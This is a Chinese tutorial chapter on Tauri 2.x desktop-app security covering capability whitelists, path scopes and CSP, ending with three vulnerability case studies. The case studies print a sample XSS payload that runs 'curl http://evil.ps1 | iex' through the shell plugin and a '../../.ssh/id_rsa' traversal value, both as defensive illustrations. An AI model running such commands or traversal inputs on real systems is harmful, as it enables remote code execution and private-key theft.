# 04-安全与权限专题：Tauri 为什么比 Electron 安全

> Tauri 的安全哲学是「默认全锁死，需要什么开什么」。这一章如果没学好，轻则所有 API 调不通、Console 里全红，重则用户电脑被一个钓鱼链接攻破。按顺序读，一条一条配，别抄网上旧博客给的「全量权限配置」。

---

## 1. Tauri 2.x 的安全三件套

你要同时搞定三层，一层漏了都会报错或被攻击：

| 层 | 名字 | 在哪配 | 管什么 |
| :--- | :--- | :--- | :--- |
| 第一层 | **Capabilities 权限白名单** | `src-tauri/capabilities/*.json` | 前端能不能调某个插件的某个 API（比如 fs 读文件、dialog 弹保存框） |
| 第二层 | **Scope 细粒度范围** | 上面同一个 capabilities JSON 的 `permissions[].allow/deny` | 就算允许你读文件，也只能读哪些目录、不能读哪些目录；就算允许发 HTTP，也只能发给哪些域名 |
| 第三层 | **CSP 内容安全策略** | `tauri.conf.json → app.security.csp` | WebView 里能不能加载外链 CSS/JS/图片、能不能 eval、能不能内嵌 iframe |

很多新手的错误做法：遇到报错 `scope not defined for url ...`、`permission not allowed`，就去搜「Tauri 全部权限」，一股脑把所有插件的所有 permission 都放进 default.json，然后 CSP 写成 `default-src * 'unsafe-inline' 'unsafe-eval'`——相当于把三层锁全拆了，那你跟 Electron 就没区别了，甚至因为你不懂安全，还不如 Electron 的默认配置安全。

## 2. Capabilities：权限白名单怎么写

### 2.1 文件位置和结构

文件在 `src-tauri/capabilities/default.json`。如果还有其他窗口（比如 admin、settings）权限要更严格，可以建多个文件：

```
capabilities/
├── default.json         # 普通窗口能用的权限
└── admin.json           # 管理窗口额外能用的权限（仅给 label=admin 的窗口）
```

`capabilities` 是一个数组，在 `tauri.conf.json` 里可以指定启用哪些：

```json
{
  "app": {
    "security": {
      "capabilities": ["default", "admin"]
    }
  }
}
```

### 2.2 一条 permission 长什么样

最小完整结构：

```json
{
  "$schema": "../gen/schemas/desktop-schema.json",
  "identifier": "default",
  "windows": ["main", "settings"],
  "permissions": [
    // 写法 1：最简单的字符串，表示开一条权限
    "dialog:allow-open",
    "dialog:allow-save",
    "dialog:allow-message",

    // 写法 2：对象形式，加上 allow/deny scope
    {
      "identifier": "fs:allow-read-file",
      "allow": ["$DOCUMENT/**", "$DESKTOP/**"],
      "deny": ["$DOCUMENT/公司机密/**"]
    }
  ]
}
```

关键细节：

- **`identifier` 是哪个窗口能用这套权限**。多窗口一定要按「最少权限」分配，比如付款窗口 / 管理员窗口可以有 shell 执行和全 fs 权限，普通主窗口就只能读文档和弹保存框。
- **`windows` 数组里写窗口 label**（就是你新建窗口时传的那个 label，和 tauri.conf.json 里 `app.windows[].label` 对应）。如果要给所有窗口，写 `["$all"]`，但不推荐。
- **所有插件的所有 permission 名可以在 [官方 Capabilities Reference](https://v2.tauri.app/reference/capabilities/) 搜到。** 别瞎猜，比如你以为 HTTP 权限叫 `http:read`，但实际是 `http:allow-fetch`，名差一个字母都不生效。

### 2.3 我推荐的「安全起步版」默认配置

新创建的项目，先不要加一堆花里胡哨的 permission。先从这份最小配置开始，用哪个加哪个：

```json
{
  "$schema": "../gen/schemas/desktop-schema.json",
  "identifier": "default",
  "description": "默认权限：普通用户窗口能用到的最小权限集合",
  "windows": ["$all"],
  "permissions": [
    // ===== 核心 core：跟窗口 / invoke 本身有关，必须开 =====
    "core:default",

    // ===== dialog：对话框（选文件/存文件/弹提示） =====
    "dialog:allow-open",
    "dialog:allow-save",
    "dialog:allow-message",
    "dialog:allow-confirm",
    "dialog:allow-ask",

    // ===== notification：系统通知 =====
    "notification:allow-notify",
    "notification:allow-request-permission",
    "notification:allow-is-permission-granted",

    // ===== shell：打开外链 / 用默认浏览器打开 URL（这个比 shell:allow-execute 安全 100 倍）=====
    "shell:allow-open",
    // ❌ 不要写 shell:allow-execute / shell:allow-spawn。除非你确实要执行本机命令，再按下面 2.4 节写 scope。

    // ===== store：本地持久化 KV（应用配置用）=====
    "store:default",
    "store:allow-get",
    "store:allow-set",
    "store:allow-save",
    "store:allow-load",
    "store:allow-delete",

    // ===== path：获取系统目录路径 =====
    "path:default",
    "path:allow-basename",
    "path:allow-dirname",
    "path:allow-join",
    "path:allow-resolve",

    // ===== fs：文件系统，默认最小 =====
    // ❌ 不要一上来就 "fs:default"。default 集合太大了。
    // 只开你确实用的：
    {
      "identifier": "fs:allow-exists",
      "allow": ["$DOCUMENT/**", "$DESKTOP/**", "$APP/**", "$DOWNLOAD/**"]
    },
    {
      "identifier": "fs:allow-read-dir",
      "allow": ["$DOCUMENT/**", "$DESKTOP/**"]
    },
    {
      "identifier": "fs:allow-read-file",
      "allow": ["$DOCUMENT/**", "$DESKTOP/**", "$APP/**", "$DOWNLOAD/**"]
    },
    {
      "identifier": "fs:allow-write-file",
      "allow": ["$DOCUMENT/你的应用名导出/**", "$DESKTOP/**", "$APP/**", "$DOWNLOAD/**"]
    },
    {
      "identifier": "fs:allow-create-dir",
      "allow": ["$DOCUMENT/你的应用名导出/**", "$DESKTOP/**"]
    }
    // fs 的其他权限（删除/重命名/复制），用到再开。
  ]
}
```

### 2.4 高风险权限一定要加 scope 限制

#### 🔴 高风险 1：`shell` 执行本地命令

**如果不是必须执行命令，就绝对不要开 `shell:allow-execute` 或 `shell:allow-spawn`。**

确实要执行（比如你做的就是一个命令行 GUI 封装工具），必须按命令白名单加 scope，不能允许执行任意命令：

```json
{
  "permissions": [
    {
      "identifier": "shell:allow-execute",
      "allow": [
        {
          "name": "git",
          "cmd": "git",
          "args": true,
          "sidecar": false
        },
        {
          "name": "ffmpeg",
          "cmd": "bin/ffmpeg",
          "args": true
        }
      ]
    }
  ]
}
```

`args: true` 表示允许传参数。你要更严格的话，可以把 `args` 写成固定数组，只允许执行特定子命令。

#### 🔴 高风险 2：`http` 发请求

做跨域前端不能请求某些 API，于是你在 Rust 端开 `http:allow-fetch`，想让 Rust 当代理。**一定要 scope 限制你只能调自己后端或正规 API 的域名，不能放开 `*://*/*`。**

```json
{
  "permissions": [
    {
      "identifier": "http:allow-fetch",
      "allow": [
        "https://api.mycubby.com/**",
        "https://restapi.amap.com/**",   // 高德地图
        "https://devapi.qweather.com/**" // 和风天气
      ],
      "deny": [
        "https://api.mycubby.com/internal/admin/**"  // 即便是自家后端，也别让前端能调管理接口
      ]
    }
  ]
}
```

没 scope 限制的话，攻击者一旦拿到你 WebView 的 XSS 执行权，就能用你的程序身份任意发 HTTP 请求（调你后端接口、冒用 IP 调第三方付费 API）。

## 3. Scope 路径变量（$DOCUMENT / $APP 这些）

所有插件里只要涉及路径，基本都支持下面这些变量。**别写死绝对路径，跨平台会炸。**

| 变量名 | 真实路径例子（Windows） | 真实路径例子（macOS） | 什么时候用 |
| :--- | :--- | :--- | :--- |
| `$APP` | `%APPDATA%\com.mycubby.app` | `~/Library/Application Support/com.mycubby.app` | 存用户数据（数据库、配置、缓存），推荐 90% 的本地文件都写这 |
| `$APPCONFIG` | 同上 `\config` 子目录 | 同上 `/Preferences` | 只存配置 JSON |
| `$APPLOCALDATA` | `%LOCALAPPDATA%\com.mycubby.app` | 同上 APP | 放不可漫游的大缓存 |
| `$APPLOG` | `%APPDATA%\com.mycubby.app\logs` | `~/Library/Logs/com.mycubby.app` | 应用日志（配合 log 插件） |
| `$DOCUMENT` / `$DOCUMENTS` | `C:\Users\你\Documents` | `~/Documents` | 用户自己要导出的笔记/报告/备份 |
| `$DESKTOP` | `C:\Users\你\Desktop` | `~/Desktop` | 用户想方便直接看到的导出物 |
| `$DOWNLOAD` / `$DOWNLOADS` | `C:\Users\你\Downloads` | `~/Downloads` | 下载的文件 |
| `$PICTURE` / `$PICTURES` | `C:\Users\你\Pictures` | `~/Pictures` | 图片处理类应用读写 |
| `$VIDEO` / `$VIDEOS` | `C:\Users\你\Videos` | `~/Movies` | 视频应用 |
| `$AUDIO` / `$MUSIC` | `C:\Users\你\Music` | `~/Music` | 音频应用 |
| `$HOME` | `C:\Users\你` | `~` | 非常不推荐直接开，范围太大，默认别用 |
| `$TEMP` | `%LOCALAPPDATA%\Temp\com.mycubby.app` | `~/Library/Caches/TemporaryItems/com.mycubby.app` | 临时文件，用完就删 |

**路径匹配语法（glob 通配符）：**

- `*`：任意字符，**不跨目录**。例：`$DOCUMENT/*.txt` 只匹配文档下一层的 txt
- `**`：任意字符，**跨目录**。例：`$DOCUMENT/**/*.md` 匹配文档下所有层级的 md 文件
- 写 scope 时，**`allow` 末尾一定要加 `/**` 或 `/*`**，不然你以为你开的是整个目录，实际只匹配了那个「名字完全等于 DOCUMENT 的文件」。

错误示例（我见过太多人写）：
```json
"allow": ["$DOCUMENT"]   // ❌ 啥都匹配不到！因为 $DOCUMENT 自己是目录，fs:allow-read-file 匹配的是文件
```
正确的：
```json
"allow": ["$DOCUMENT/**"]   // ✅ 所有文档目录下的任意层级任意文件
```

## 4. CSP 内容安全策略

CSP 不是 Tauri 发明的，是浏览器/WebView 本身的机制。它控制 WebView 能加载哪些外部资源、能执行哪些脚本。

### 4.1 先看默认行为

如果你 `tauri.conf.json` 里 `"security": { "csp": null }` 或者不写这个字段，Tauri 会给你一个默认 CSP，它的效果是：

- ✅ 能加载本地资源（打包进的 JS/CSS/图片、`convertFileSrc` 转换的本地文件路径）
- ✅ 能执行本地打包好的脚本
- ❌ 不能加载外链 JS（unpkg/jsdelivr CDN 的 <script src="https://unpkg..."> 全部拒绝）
- ❌ 不能执行 `eval()`、`new Function()`、`<script>` 字符串拼接等动态代码
- ❌ 不能加载 `<iframe>` 的第三方页面
- ❌ 不能 fetch 未在 http scope 允许的域名

### 4.2 什么时候你需要自己写 CSP

| 你要做的事 | 需要在 CSP 加什么 |
| :--- | :--- |
| 加载外部图片（比如显示淘宝商品图 / 天气预报图） | `img-src` 里加对应的域名或 `https:` 通配 |
| 调用某个外部 REST API | `connect-src` 里加域名 |
| 内嵌 YouTube/B 站 iframe 播放器 | `frame-src` 里加 `https://www.youtube.com` `https://player.bilibili.com` |
| 用某个老 JS 库必须 `eval()` | `script-src` 加 `'unsafe-eval'`（**非必须别加**） |
| 写 Vue / React 用了 inline style（内联 style 很常见） | `style-src` 加 `'unsafe-inline'`（这个基本都要加，没太大风险） |

### 4.3 一份真实常用的 CSP 配置示例

```json
{
  "app": {
    "security": {
      "csp": "default-src 'self' asset: ipc: http://asset.localhost; img-src 'self' asset: data: https:; style-src 'self' 'unsafe-inline'; script-src 'self'; connect-src 'self' ipc: https://api.mycubby.com https://devapi.qweather.com; frame-src 'self' https://player.bilibili.com"
    }
  }
}
```

每条指令说明：

| 指令 | 我写了啥 | 啥意思 |
| :--- | :--- | :--- |
| `default-src` | `'self' asset: ipc: http://asset.localhost` | 默认所有资源都只允许 ①打包进应用的本地文件、②asset:协议（Tauri 本地文件转的 URL）、③ipc:（Tauri IPC 通信专用）。这是最严的基线。 |
| `img-src` | `'self' asset: data: https:` | 图片可以来自：本地、转换的本地路径、base64 data URI、任意 HTTPS 网络图片。如果只允许特定域名图片，就别写 `https:`，写具体域名更安全。 |
| `style-src` | `'self' 'unsafe-inline'` | 样式允许：本地产的 CSS、以及内联 style（Vue/React 几乎都用）。 |
| `script-src` | `'self'` | JS 只允许本地打包好的。**绝对不要写 `'unsafe-eval'` 或外链 CDN script。** 要装库就 pnpm install 进来打包。 |
| `connect-src` | `'self' ipc: https://api.mycubby.com ...` | fetch/WebSocket 只能走自家后端和风天气。想放开给什么域名就加什么域名。 |
| `frame-src` | `'self' https://player.bilibili.com` | 只能嵌 B 站播放器 iframe，别的全拦。 |

### 4.4 CSP 报错怎么看

DevTools Console 里报错长这样：
```
Refused to load the stylesheet 'https://cdn.jsdelivr.net/npm/element-plus/dist/index.css' because it violates the following Content Security Policy directive: "style-src 'self'".
```

意思：**`style-src` 没把 jsdelivr 加进去。** 修法：在 `style-src` 后面加 `https://cdn.jsdelivr.net`（或者更推荐：pnpm add element-plus，从 node_modules 打包进来，根本不用 CDN）。

## 5. 三个真实的 Tauri 安全漏洞案例（从 Bug Bounty 和官方安全公告摘的，别自己踩）

### 🔴 案例一：fs 权限 scope 写太松，被 `../` 路径穿越读走 SSH 私钥

**场景复现：** 某笔记应用 capabilities 里写了 `"fs:allow-read-file"` 但 allow 写成 `$APP/**`，没做后端路径归一化（canonicalize）。

攻击者在笔记标题里写 `"../../.ssh/id_rsa"`，保存后应用会把文件读出来展示「附件名」。结果用户的私钥被读到笔记里，同步上了云。

**修法：** 两个同时做：
1. scope 里 `allow` 缩到最小必要目录；
2. Rust 命令里用 `std::fs::canonicalize(&path)` 把路径归一化（所有 `../` 解析掉），然后判断 `canonicalized.starts_with(&allowed_base_dir)`。**不要在前端判断路径，前端传什么都可能是假的，必须 Rust 后端重新判。**

### 🔴 案例二：shell:allow-execute 没写 scope，被 XSS 后拿下整台机器

**场景复现：** 某 RSS 阅读器为了「方便用户用默认浏览器打开链接」开了 `shell:allow-execute` 没写 args 白名单。Feed 内容里本来就允许 HTML，作者给一篇文章加了个 XSS payload，执行了：

```ts
invoke('plugin:shell|execute', { program: 'cmd', args: ['/c', 'curl http://evil.ps1 | iex'] })
```

直接执行任意 PowerShell，用户电脑被种木马。

**修法：**
1. 打开外部网页用「`shell:allow-open`」就够了，这个 API 只能打开 URL/文件，不能执行任意命令。**绝对不要用 execute 去开浏览器。**
2. 非用 `shell:allow-execute` 不可的，按 2.4 节把命令名+args 写死 scope 白名单，一个字节都不要松。

### 🔴 案例三：CSP 开了 `unsafe-eval` + 外链 script-src，被钓鱼 HTML 直接弹系统对话框

**场景复现：** 某应用内嵌了一个第三方的 HTML 小游戏插件页，作者懒得打包依赖，用了 CDN `<script>`，于是 `script-src` 写了 `'self' https://unpkg.com 'unsafe-eval'`。第三方 unpkg 被投毒后，恶意代码在 WebView 内执行了 Tauri 的所有 dialog 权限 API，连续弹了 30 个「系统更新」对话框，诱导用户下载假的安装包 exe。

**修法：**
1. `script-src` 只写 `'self'`，所有依赖走 pnpm/npm 打包。
2. 非用外链不可的，加到完整子资源完整性 SRI（`<script src="..." integrity="sha256-xxxx">`），只允许特定 hash 的资源加载。
3. 把需要联网的页面单独开一个低权限窗口（比如 `capabilities/games.json`，只保留 `dialog:allow-message`，fs、shell、store 权限一个都不给）。

## 6. 本章自检清单（每次改 capabilities / CSP 都过一遍）

- [ ] capabilities 有没有按窗口分配？不相关的窗口有没有拿到多余的权限？
- [ ] fs/http/shell 三个高风险插件有没有都写了 allow scope？
- [ ] 有没有写 `"permissions": ["fs:default", "http:default"]` 这种大集合（应该拆成具体的 identifier 加 scope）？
- [ ] 所有路径 allow 末尾都带 `/**` 了吗？
- [ ] CSP 里 `script-src` 有没有 `'unsafe-eval'`？（非必须删掉）
- [ ] CSP 里 `connect-src` 有没有只放开必要的域名？
- [ ] Rust 端所有接收到前端传来「路径 / 文件名 / URL」的命令，都做了归一化和白名单检查吗？
- [ ] 如果之前抄了网上旧博客「全量权限配置」，你删掉那些你根本用不到的 permission 了吗？
